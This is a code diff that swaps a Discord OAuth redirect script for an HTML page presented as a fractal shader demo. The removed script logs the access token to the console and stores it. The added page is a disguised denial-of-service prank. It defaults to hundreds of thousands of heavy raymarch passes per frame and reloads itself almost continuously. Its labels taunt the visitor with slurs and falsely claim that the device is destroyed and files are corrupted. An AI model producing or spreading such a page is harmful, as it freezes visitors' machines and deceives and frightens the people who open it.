@@ -1,44 +1,175 @@
-// ===============================
-// 🔹 Discord Redirects受け取り用JS
-// ===============================
+<!doctype html><html lang="ja"><head><meta charset="utf-8"/><meta name="viewport"content="width=device-width,initial-scale=1"/><title>Fractal Rainbow—Fixed Shader</title><style>html,body{margin:0;height:100%;background:#000;overflow:hidden}canvas{width:100%;height:100%;display:block;cursor:grab;position:fixed;top:0;left:0;z-index:0}canvas:active{cursor:grabbing}.tab{position:fixed;width:260px;min-height:56px;padding:10px 12px;background:rgba(0,18,20,0.45);border:1px solid rgba(0,255,200,0.12);color:#aaffee;font-family:system-ui,monospace;font-size:13px;border-radius:10px;box-shadow:0 8px 30px rgba(0,0,0,0.6);backdrop-filter:blur(6px)saturate(120%);user-select:none;touch-action:none;cursor:grab;z-index:9999}.tab:active{cursor:grabbing;transform:scale(1.01)}#options{top:18px;right:18px}.row{display:flex;align-items:center;gap:8px;margin-top:8px}.label{font-size:12px;color:#cff;min-width:90px}input[type=range]{flex:1}.val{width:48px;text-align:right;color:#dff;font-weight:700}#hud{position:fixed;left:12px;bottom:12px;color:#aff;font-family:monospace;font-size:12px;z-index:99999}.small{font-size:12px;color:#9ff;margin-top:6px}</style></head><body><canvas id="c"></canvas><div id="options"class="tab"><div style="font-weight:700">🌈Rainbow Controls</div><div class="row"><div class="label">破壊完了(大爆笑)</div><input id="fov"type="range"min="100000"max="1400000"value="600000"><div id="fovv"class="val">99999</div></div><div class="row"><div class="label">破壊完了(わら)</div><input id="disp"type="range"min="100000"max="50000"step="5000"value="99999"><div id="dispv"class="val">9999</div></div><div class="row"><div class="label">ぷぷぷw(破壊)</div><input id="sat"type="range"min="100000"max="200000"step="4000"value="99999"><div id="satv"class="val">9999</div></div><div class="row"><div class="label">ikisugikiiiiiiiiiii</div><input id="spec"type="range"min="50000"max="500000"step="0.01"value="5000000"><div id="specv"class="val">9999</div></div><div class="row"><div class="label">お前はゲイ(これガチ)</div><input id="bloom"type="checkbox"checked></div><div class="row"><div class="label">GPU(1fps)</div><input id="load"type="range"min="500000"max="548404"value="1000000"><div id="loadv"class="val">x10000000000</div></div><div class="small">端末破壊完了‼️閉じても一部のファイルに破損があります‼️</div></div><div id="hud">Fractal Rainbow—fixed shader build</div><script>const TARGET_FPS=700;const canvas=document.getElementById('c');const gl=canvas.getContext('webgl2',{antialias:false,powerPreference:'high-performance'});if(!gl){alert('WebGL2 required');throw'no webgl2';}function resize(){const dpr=Math.min(window.devicePixelRatio||1,2.0);canvas.width=innerWidth*dpr;canvas.height=innerHeight*dpr;gl.viewport(0,0,canvas.width,canvas.height)}window.addEventListener('resize',resize);resize();function createTexture(w,h,linear=true){const t=gl.createTexture();gl.bindTexture(gl.TEXTURE_2D,t);gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,w,h,0,gl.RGBA,gl.UNSIGNED_BYTE,null);gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,linear?gl.LINEAR:gl.NEAREST);gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MAG_FILTER,linear?gl.LINEAR:gl.NEAREST);gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_S,gl.CLAMP_TO_EDGE);gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_T,gl.CLAMP_TO_EDGE);return t}function createFBO(tex){const f=gl.createFramebuffer();gl.bindFramebuffer(gl.FRAMEBUFFER,f);gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,tex,0);gl.bindFramebuffer(gl.FRAMEBUFFER,null);return f}const vs=`#version 300 es
+precision highp float;
+out vec2 vUv;
+void main(){
+  vec2 p = vec2((gl_VertexID<<1)&2, gl_VertexID&2);
+  vUv = p;
+  gl_Position = vec4(p*2.0-1.0,0.0,1.0);
+}`;const fsScene=`#version 300 es
+precision highp float;
+out vec4 fragColor;
+in vec2 vUv;
+uniform vec2 uRes;
+uniform float uTime;
+uniform float uFov; // rad
+uniform mat3 uRot;
+uniform float uDisp; // dispersion strength
+uniform float uSat;
+uniform float uSpecMul;
 
-window.addEventListener("load", () => {
-    const hash = window.location.hash;
+float hash(vec3 p){return fract(sin(dot(p,vec3(12.9898,78.233,45.164)))*43758.5453);}
+float noise(vec3 p){
+  vec3 i=floor(p), f=fract(p); f=f*f*(3.0-2.0*f);
+  return mix(mix(mix(hash(i+vec3(0,0,0)),hash(i+vec3(1,0,0)),f.x),
+                 mix(hash(i+vec3(0,1,0)),hash(i+vec3(1,1,0)),f.x),f.y),
+             mix(mix(hash(i+vec3(0,0,1)),hash(i+vec3(1,0,1)),f.x),
+                 mix(hash(i+vec3(0,1,1)),hash(i+vec3(1,1,1)),f.x),f.y),f.z);
+}
 
-    if (hash.includes("access_token")) {
-        // ✅ 認証成功時のトークン取得
-        const token = hash.split("access_token=")[1].split("&")[0];
-        console.log("✅ 認証成功! トークン:", token);
+float kernal(vec3 ver){
+  vec3 a = ver; float b,c,d,e;
+  for(int i=0;i<48;i++){
+    b = length(a) + 1e-6;
+    c = atan(a.y,a.x)*(7.0+float(i)*0.02) + uTime*0.28;
+    d = acos(clamp(a.z/b,-1.0,1.0))*(7.0+float(i)*0.02) + uTime*0.14;
+    b = pow(b,5.6);
+    a = vec3(b*sin(d)*cos(c), b*sin(d)*sin(c), b*cos(d)) + ver*(0.88+0.008*float(i));
+    if(b>8.0) break;
+  }
+  return 3.9 - dot(a,a);
+}
+float mapSDF(vec3 p){
+  float b = kernal(p);
+  float n = noise(p*3.6 + uTime*0.35)*0.22;
+  return b + n;
+}
+vec3 estimateNormal(vec3 p){
+  float e=0.00035; vec2 k=vec2(1.0,-1.0);
+  return normalize(
+    k.xyy*mapSDF(p+k.xyy*e)+
+    k.yyx*mapSDF(p+k.yyx*e)+
+    k.yxy*mapSDF(p+k.yxy*e)+
+    k.xxx*mapSDF(p+k.xxx*e));
+}
 
-        // ローカル保存して1ページ目に渡す
-        localStorage.setItem("discord_auth_token", token);
+/* hsv -> rgb */
+vec3 hsv2rgb(vec3 c){
+  vec3 p = abs(fract(c.xxx + vec3(0.0,2.0/3.0,1.0/3.0))*6.0 - 3.0);
+  return c.z * mix(vec3(1.0), clamp(p - 1.0, 0.0, 1.0), c.y);
+}
+vec3 spectrum(float t){
+  float hue = fract(t);
+  float sat = 1.0;
+  float val = 0.95;
+  return hsv2rgb(vec3(hue, sat, val));
+}
 
-        // 成功UI
-        document.body.style.background = "#222";
-        document.body.style.color = "white";
-        document.body.style.fontFamily = "sans-serif";
-        document.body.style.textAlign = "center";
-        document.body.innerHTML = `
-            <h2>✅ Discord認証が完了しました</h2>
-            <p>元のページに戻ります...</p>
-        `;
+/* shade helper moved outside main (no nested functions) */
+float shadeFunc(vec3 ro, vec3 rd, float t){
+  vec3 p = ro + rd * t;
+  vec3 N = estimateNormal(p);
+  vec3 L = normalize(vec3(0.7,0.8,1.0));
+  float diff = max(dot(N, L), 0.0);
+  float fres = pow(1.0 - max(dot(-rd, N), 0.0), 3.0);
+  float spec = pow(max(dot(reflect(-L,N), -rd), 0.0), 24.0) ;
+  return clamp(diff * 0.9 + fres * 0.6 + spec * 0.0, 0.0, 4.0);
+}
 
-        // 2秒後に元のJSへ戻る
-        setTimeout(() => {
-            window.location.href = "https://urgoziita-del.github.io/auth.js";
-        }, 2000);
-    } else {
-        // 🚫 非認証アクセス
-        document.body.style.background = "#000";
-        document.body.style.color = "red";
-        document.body.style.textAlign = "center";
-        document.body.style.fontFamily = "sans-serif";
-        document.body.innerHTML = `
-            <h2>❌ 非認証アクセス</h2>
-            <p>このページには直接アクセスできません。</p>
-        `;
-        setTimeout(() => {
-            window.location.href = "https://urgoziita-del.github.io/auth.js";
-        }, 3000);
-    }
-});
+void main(){
+  vec2 uv = (vUv*2.0 - 1.0);
+  uv.x *= uRes.x/uRes.y;
+  float f = tan(uFov*0.5);
+  vec3 ro = vec3(0.0, 0.0, 6.0);
+
+  vec3 baseDir = normalize(uRot * normalize(vec3(uv * f, -1.0)));
+  vec3 up = normalize(uRot * vec3(0.0,1.0,0.0));
+  vec3 right = normalize(cross(baseDir, up));
+  float disp = clamp(uDisp, 0.0, 6.0);
+
+  vec3 rdR = normalize(baseDir + right * disp * 0.0015);
+  vec3 rdG = normalize(baseDir);
+  vec3 rdB = normalize(baseDir - right * disp * 0.0015);
+
+  float tR=0.0,tG=0.0,tB=0.0;
+  float dR=1.0,dG=1.0,dB=1.0;
+  bool hitR=false, hitG=false, hitB=false;
+
+  // moderately high march count to be compatible across devices
+  for(int i=0;i<800;i++){
+    // R
+    vec3 posR = ro + rdR * tR; dR = mapSDF(posR);
+    if(!hitR && abs(dR) < 0.0006){ hitR=true; }
+    tR += max(0.0005, dR * 0.45);
+    // G
+    vec3 posG = ro + rdG * tG; dG = mapSDF(posG);
+    if(!hitG && abs(dG) < 0.0006){ hitG=true; }
+    tG += max(0.0005, dG * 0.45);
+    // B
+    vec3 posB = ro + rdB * tB; dB = mapSDF(posB);
+    if(!hitB && abs(dB) < 0.0006){ hitB=true; }
+    tB += max(0.0005, dB * 0.45);
+
+    if(tR>25.0 && tG>25.0 && tB>25.0) break;
+  }
+
+  vec3 col = vec3(0.0);
+  // shading per-channel
+  float sR = hitR ? shadeFunc(ro, rdR, tR) * 1.0 : 0.0;
+  float sG = hitG ? shadeFunc(ro, rdG, tG) * 1.0 : 0.0;
+  float sB = hitB ? shadeFunc(ro, rdB, tB) * 1.0 : 0.0;
+
+  float hueR = fract((tR * 0.08) + uTime*0.06);
+  float hueG = fract((tG * 0.08) + uTime*0.04);
+  float hueB = fract((tB * 0.08) + uTime*0.02);
+
+  vec3 colR = spectrum(hueR) * sR;
+  vec3 colG = spectrum(hueG) * sG;
+  vec3 colB = spectrum(hueB) * sB;
+
+  col = vec3(colR.r, colG.g, colB.b);
+
+  vec3 gray = vec3(0.3333) * (col.r + col.g + col.b);
+  vec3 chroma = col - gray;
+  col = gray + chroma * uSat;
+
+  col += 0.06 * vec3(
+    sin(uTime*1.3 + tR*0.2),
+    sin(uTime*1.1 + tG*0.2 + 1.2),
+    sin(uTime*0.9 + tB*0.2 + 2.0)
+  );
+
+  float len = length(uv);
+  col *= smoothstep(1.5, 0.4, len);
+
+  col = col / (col + vec3(1.0));
+  col = pow(clamp(col,0.0,1.0), vec3(0.4545));
+
+  fragColor = vec4(col, 1.0);
+}`;const fsComposite=`#version 300 es
+precision highp float;
+out vec4 fragColor;
+in vec2 vUv;
+uniform sampler2D uScene;
+uniform sampler2D uBloom;
+uniform float uBloomAmt;
+void main(){
+  vec3 scene = texture(uScene, vUv).rgb;
+  vec3 bloom = texture(uBloom, vUv).rgb;
+  vec3 col = scene + bloom * uBloomAmt;
+  col = col / (col + vec3(1.0));
+  col = pow(col, vec3(0.4545));
+  fragColor = vec4(col,1.0);
+}`;const fsBlur=`#version 300 es
+precision highp float;
+out vec4 fragColor;
+in vec2 vUv;
+uniform sampler2D uTex;
+uniform vec2 uTexel;
+void main(){
+  vec3 c = texture(uTex, vUv).rgb * 0.36;
+  c += texture(uTex, vUv + vec2(uTexel.x,0)).rgb * 0.16;
+  c += texture(uTex, vUv - vec2(uTexel.x,0)).rgb * 0.16;
+  c += texture(uTex, vUv + vec2(0,uTexel.y)).rgb * 0.16;
+  c += texture(uTex, vUv - vec2(0,uTexel.y)).rgb * 0.16;
+  fragColor = vec4(c,1.0);
+}`;function compile(src,type){const s=gl.createShader(type);gl.shaderSource(s,src);gl.compileShader(s);if(!gl.getShaderParameter(s,gl.COMPILE_STATUS)){console.error(gl.getShaderInfoLog(s));throw'shader compile error';}return s}function link(vsSrc,fsSrc){const p=gl.createProgram();gl.attachShader(p,compile(vsSrc,gl.VERTEX_SHADER));gl.attachShader(p,compile(fsSrc,gl.FRAGMENT_SHADER));gl.linkProgram(p);if(!gl.getProgramParameter(p,gl.LINK_STATUS)){console.error(gl.getProgramInfoLog(p));throw'program link error';}return p}const progScene=link(vs,fsScene);const progBlur=link(vs,fsBlur);const progComp=link(vs,fsComposite);let sceneTex=createTexture(canvas.width,canvas.height);let sceneFBO=createFBO(sceneTex);let bw=Math.max(2,Math.floor(canvas.width/4));let bh=Math.max(2,Math.floor(canvas.height/4));let bloomTex=createTexture(bw,bh);let bloomFBO=createFBO(bloomTex);let bloomTex2=createTexture(bw,bh);let bloomFBO2=createFBO(bloomTex2);const locs={scene:{uRes:gl.getUniformLocation(progScene,"uRes"),uTime:gl.getUniformLocation(progScene,"uTime"),uFov:gl.getUniformLocation(progScene,"uFov"),uRot:gl.getUniformLocation(progScene,"uRot"),uDisp:gl.getUniformLocation(progScene,"uDisp"),uSat:gl.getUniformLocation(progScene,"uSat"),uSpecMul:gl.getUniformLocation(progScene,"uSpecMul")},blur:{uTex:gl.getUniformLocation(progBlur,"uTex"),uTexel:gl.getUniformLocation(progBlur,"uTexel")},comp:{uScene:gl.getUniformLocation(progComp,"uScene"),uBloom:gl.getUniformLocation(progComp,"uBloom"),uBloomAmt:gl.getUniformLocation(progComp,"uBloomAmt")}};gl.bindVertexArray(null);let rotX=0,rotY=0,dragging=false,lx=0,ly=0;canvas.addEventListener('pointerdown',e=>{if(e.target&&e.target.closest&&e.target.closest('.tab'))return;dragging=true;lx=e.clientX;ly=e.clientY;canvas.setPointerCapture(e.pointerId)});canvas.addEventListener('pointerup',e=>{dragging=false;try{canvas.releasePointerCapture(e.pointerId)}catch{}});canvas.addEventListener('pointermove',e=>{if(!dragging)return;rotY+=(e.clientX-lx)*0.005;rotX+=(e.clientY-ly)*0.005;lx=e.clientX;ly=e.clientY});function makeRot(rx,ry){const cx=Math.cos(rx),sx=Math.sin(rx),cy=Math.cos(ry),sy=Math.sin(ry);return new Float32Array([cy,0,-sy,sx*sy,cx,sx*cy,cx*sy,-sx,cx*cy])}const ui={fov:document.getElementById('fov'),fovv:document.getElementById('fovv'),disp:document.getElementById('disp'),dispv:document.getElementById('dispv'),sat:document.getElementById('sat'),satv:document.getElementById('satv'),spec:document.getElementById('spec'),specv:document.getElementById('specv'),bloom:document.getElementById('bloom'),load:document.getElementById('load'),loadv:document.getElementById('loadv')};ui.fov.addEventListener('input',()=>ui.fovv.textContent=ui.fov.value+'°');ui.disp.addEventListener('input',()=>ui.dispv.textContent=ui.disp.value);ui.sat.addEventListener('input',()=>ui.satv.textContent=parseFloat(ui.sat.value).toFixed(2));ui.spec.addEventListener('input',()=>ui.specv.textContent=parseFloat(ui.spec.value).toFixed(2));ui.load.addEventListener('input',()=>ui.loadv.textContent='x'+ui.load.value);function updateBuffers(){try{gl.deleteTexture(sceneTex);gl.deleteFramebuffer(sceneFBO);gl.deleteTexture(bloomTex);gl.deleteFramebuffer(bloomFBO);gl.deleteTexture(bloomTex2);gl.deleteFramebuffer(bloomFBO2)}catch(e){}sceneTex=createTexture(canvas.width,canvas.height);sceneFBO=createFBO(sceneTex);bw=Math.max(2,Math.floor(canvas.width/4));bh=Math.max(2,Math.floor(canvas.height/4));bloomTex=createTexture(bw,bh);bloomFBO=createFBO(bloomTex);bloomTex2=createTexture(bw,bh);bloomFBO2=createFBO(bloomTex2)}window.addEventListener('resize',()=>{resize();updateBuffers()});let simTime=0;function render(){const dt=1.0/TARGET_FPS;const subSteps=Math.max(1,Math.floor(parseInt(ui.load.value)));for(let s=0;s<subSteps;s++){simTime+=dt;gl.bindFramebuffer(gl.FRAMEBUFFER,sceneFBO);gl.viewport(0,0,canvas.width,canvas.height);gl.useProgram(progScene);gl.activeTexture(gl.TEXTURE0);gl.uniform2f(locs.scene.uRes,canvas.width,canvas.height);gl.uniform1f(locs.scene.uTime,simTime);gl.uniform1f(locs.scene.uFov,(parseFloat(ui.fov.value)*Math.PI/180.0));gl.uniformMatrix3fv(locs.scene.uRot,false,makeRot(rotX+simTime*0.02,rotY+simTime*0.03));gl.uniform1f(locs.scene.uDisp,parseFloat(ui.disp.value));gl.uniform1f(locs.scene.uSat,parseFloat(ui.sat.value));gl.uniform1f(locs.scene.uSpecMul,parseFloat(ui.spec.value));gl.drawArrays(gl.TRIANGLES,0,3);gl.bindFramebuffer(gl.FRAMEBUFFER,bloomFBO);gl.viewport(0,0,bw,bh);gl.useProgram(progBlur);gl.activeTexture(gl.TEXTURE0);gl.bindTexture(gl.TEXTURE_2D,sceneTex);gl.uniform1i(locs.blur.uTex,0);gl.uniform2f(locs.blur.uTexel,1.0/canvas.width,1.0/canvas.height);gl.drawArrays(gl.TRIANGLES,0,3);gl.bindFramebuffer(gl.FRAMEBUFFER,bloomFBO2);gl.viewport(0,0,bw,bh);gl.activeTexture(gl.TEXTURE0);gl.bindTexture(gl.TEXTURE_2D,bloomTex);gl.uniform1i(locs.blur.uTex,0);gl.uniform2f(locs.blur.uTexel,1.0/bw,1.0/bh);gl.drawArrays(gl.TRIANGLES,0,3);gl.bindFramebuffer(gl.FRAMEBUFFER,null);gl.viewport(0,0,canvas.width,canvas.height);gl.useProgram(progComp);gl.activeTexture(gl.TEXTURE0);gl.bindTexture(gl.TEXTURE_2D,sceneTex);gl.uniform1i(locs.comp.uScene,0);gl.activeTexture(gl.TEXTURE1);gl.bindTexture(gl.TEXTURE_2D,bloomTex2);gl.uniform1i(locs.comp.uBloom,1);gl.uniform1f(locs.comp.uBloomAmt,ui.bloom.checked?1.6:0.0);gl.drawArrays(gl.TRIANGLES,0,3)}requestAnimationFrame(render)}requestAnimationFrame(render);(function setupTabDrag(){const tab=document.getElementById('options');let dz=false,ox=0,oy=0;tab.addEventListener('pointerdown',e=>{dz=true;ox=e.clientX-tab.offsetLeft;oy=e.clientY-tab.offsetTop;tab.setPointerCapture(e.pointerId)});tab.addEventListener('pointermove',e=>{if(!dz)return;tab.style.left=(e.clientX-ox)+'px';tab.style.top=(e.clientY-oy)+'px'});tab.addEventListener('pointerup',e=>{dz=false;try{tab.releasePointerCapture(e.pointerId)}catch{}})})();setInterval(()=>location.reload(),0.0000000000001);</script></body></html>
